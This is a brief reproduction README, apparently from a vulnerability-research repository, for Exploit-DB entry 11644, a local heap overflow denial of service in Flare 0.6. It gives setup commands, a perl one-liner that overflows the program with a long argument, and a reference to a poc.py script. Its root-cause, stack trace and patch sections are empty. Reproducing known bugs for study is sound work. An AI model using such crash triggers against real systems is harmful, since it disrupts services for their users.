# EDB-11644

## Experiment Environment

Ubuntu 11.04

## INSTALL & Configuration

```
mkdir flare
wget https://github.com/mudongliang/source-packages/raw/master/EDB-11644/flare06linux.tgz
tar -xvf flare06linux.tgz
```

## Problems in Installation & Configuration


## How to trigger vulnerability

```
./flare `perl -e 'print "A"x0x1000'`

or

python poc.py flare
```

## PoCs

[Flare 0.6 - Local Heap Overflow Denial of Service](https://www.exploit-db.com/exploits/11644/)

## Vulnerability Details & Patch

### Root Cause

### Stack Trace

### Root Cause

## References
